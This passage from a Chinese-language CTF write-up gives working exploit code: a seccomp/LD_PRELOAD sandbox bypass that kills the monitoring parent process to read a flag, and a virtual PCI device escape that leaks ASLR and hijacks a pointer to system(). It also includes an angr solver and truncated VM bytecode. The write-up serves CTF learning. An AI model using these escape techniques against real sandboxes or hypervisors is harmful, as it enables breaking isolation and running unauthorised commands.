            }
        }
    }
    int main()
    {
        return 0;
    }
        '''
        data = {
            'code': code
        }
        r = requests.post(url, data=data)
        with open(dst, 'wb') as fd:
            for line in r.iter_lines():
                fd.write(b64decode(line))
    if __name__ == '__main__':
        from sys import argv
        getfile(argv[1], argv[2])
先拖web_server.py下来，其中关键位置：
    ...
            os.popen('su sandbox -c "gcc /tmp/%s.c /home/sandbox/init.c -s -w -o /tmp/%s "' % (name, name)).read()
            if(os.access('/tmp/%s' % (name), os.F_OK) == True):
                p = os.popen('su sandbox -c "/home/sandbox/daemon /tmp/%s"' % (name))
    ...
可以看到两个关键文件init.c，和daemon，把它们和libhook.so都获取下来分析
libhook.so就这个，应该是防止执行system之类的
init.c就是白名单了，但是可以写个init函数先于它执行就可以绕过
    ...
    void sandbox_init()
    {
        struct sock_filter filter[] = {
            BPF_STMT(BPF_LD|BPF_W|BPF_ABS, 4),
            BPF_JUMP(BPF_JMP|BPF_JEQ, 0xc000003e, 0, 9),
            BPF_STMT(BPF_LD|BPF_W|BPF_ABS, 0),
            BPF_JUMP(BPF_JMP|BPF_JEQ, SYS_exit, 9, 0),
            BPF_JUMP(BPF_JMP|BPF_JEQ, SYS_fstat, 8, 0),
            BPF_JUMP(BPF_JMP|BPF_JEQ, SYS_brk, 7, 0),
            BPF_JUMP(BPF_JMP|BPF_JEQ, SYS_exit, 6, 0),
            BPF_JUMP(BPF_JMP|BPF_JEQ, SYS_alarm, 5, 0),
            BPF_JUMP(BPF_JMP|BPF_JEQ, SYS_write, 4, 0),
            BPF_JUMP(BPF_JMP|BPF_JEQ, SYS_read, 3, 0),
            BPF_JUMP(BPF_JMP|BPF_JEQ, SYS_mmap, 2, 0),
            BPF_JUMP(BPF_JMP|BPF_JEQ, SYS_exit_group, 1, 0),
            BPF_STMT(BPF_RET|BPF_K, SECCOMP_RET_ERRNO | (1 & SECCOMP_RET_DATA)),
            BPF_STMT(BPF_RET|BPF_K, SECCOMP_RET_ALLOW),
        };
    ...
daemon应该就是是所谓的黑名单
daemon先是读了5字节的flag，保存了下来，然后设置环境变量LD_PRELOAD为libhook.so，然后又fork进程执行程序post上去的程序
打开不了flag的原因是，daemon进程对fork出来的子进程实时检测，遇到打开文件的操作，先读取文件的5字节，然后与保存的flag的前五字节比对，一样的话就会阻止
参考文章：
可以用fork的方式绕过，但是这里尝试后发现fork不能使用，那就将父进程杀死来绕过
    kill(getppid(),SIGKILL);
然后再读取flag，完整exp:
    #include 
    #include 
    #include 
    void __attribute__((constructor)) test_init(void) {
        char buf[0x100];
        kill(getppid(),SIGKILL);
        int fd = open("flag", 0);
        if (fd 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    void *mmio;
    uint64_t xors[5];
    uint32_t mmio_read(uint32_t addr)
    {
        return *(uint32_t *)(mmio+addr);
    }
    uint64_t mmio_readu64(uint32_t addr)
    {
        return (((uint64_t)mmio_read(addr+4)) > 32;
    }
    void get_xors()
    {
        for(int i=0;i<5;i++)
        {
            mmio_writeu64(0x0+i*8,0);
            xors[i] = mmio_readu64(0x0+i*8);
            printf("xors[%d]:%p\n",i,xors[i]);
        }
    }
    int main()
    {
        int fd = open("/sys/bus/pci/devices/0000:00:04.0/resource0",O_RDWR);
        mmio = mmap(0,0x1000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,0);
        if(mmio == MAP_FAILED){
            puts("mmio init failed");
            exit(-1);
        }
        uint64_t cbase = mmio_readu64(0x20) - 0x3A9EA8;
        printf("aslr base:%p\n",cbase);
        get_xors();
        mmio_writeu64(0x20,xors[4]^(cbase+0x00000000002CCB60));//system
        mmio_writeu64(0,xors[0]^0x67616c6620746163);//cat flag
        mmio_writeu64(8,xors[1]);//'\0'
        iopl(3);
        outl(0,0xc660);
    }
## RE
###  EasyRe
先使用angr爆出第一步
    import angr, sys
    path_to_binary='./EasyRe'
    project = angr.Project(path_to_binary)
    initial_state = project.factory.entry_state()
    simulation = project.factory.simgr(initial_state)
    target = 0x8048C0B
    avoid_addr = 0x8048C46
    simulation.explore(find=target, avoid=avoid_addr)
    if simulation.found:
        solution_state = simulation.found[0]
        print(solution_state.posix.dumps(sys.stdin.fileno()))
    else:
        raise Exception('Could not find the solution')
后面VM 爆破
    char CODES[467] =
    {
      '\t',
      '\x10',
      '\x80',
      '\x02',
      '\r',
      '\0',
      '\0',
      '\0',
      '\"',
      'w',
      '\x10',
      '\x80',
      '\x02',
      '\t',
      '\0',
      '\0',
      '\0',
      '#',
      '\x80',
      '\x02',
      '\0',
      '\x96',
      '\xF3',
      'x',
      '1',
      'w',
      '\x10',
      '\x80',
      '\x02',
      '\x11',
      '\0',
      '\0',
      '\0',
      '#',
      '\x80',
      '\x02',
      '\0',
      '\0',
      '\xD4',
      '\x85',
      '1',
      'w',
      '\x10',
      '\x80',
      '\x02',
      '\x13',
      '\0',
      '\0',
      '\0',
      '\"',
      'w',
      '\xA0',
      '\t',
      '\x80',
      '\x02',
      '\xFF',
      '\0',
      '\0',
      '\0',
      '1',
      '\x80',
      '\x03',
      '\x02',
      '\0',
      '\0',
      '\0',
      'C',
      '\x80',
      '\x02',
      '\x18',
      '\0',
      '\0',
      '\0',
      'A',
      '\xA4',
      '\0',
      '\0',
      '\0',
      '\t',
      '\x80',
      '\x02',
      '\b',
      '\0',
      '\0',
      '\0',
      '\"',
      '\x80',
      '\x02',
      '\xFF',
      '\0',
      '\0',
      '\0',
      '1',
      '\x80',
      '\x05',
      '\a',
      '\0',
      '\0',
      '\0',
      'D',
      '\x80',
      '\x02',
      '!',
      '\0',
      '\0',
      '\0',
      'A',
      '\xA4',
      '\x01',
      '\0',
      '\0',
      '\t',
      '\x80',
      '\x02',
      '\x10',
      '\0',
      '\0',
      '\0',
      '\"',
      '\x80',
      '\x02',
      '\xFF',
      '\0',
      '\0',
      '\0',
      '1',
      '\x80',
      '\t',
      '\xBB',
      '\0',
      '\0',
      '\0',
      'w',
      '\x80',
      '\x02',
      '\xFF',
      '\0',
      '\0',
      '\0',
      'A',
      '\xA4',
      '\x02',
      '\0',
      '\0',
      '\t',
      '\x80',
      '\x02',
      '\x18',
      '\0',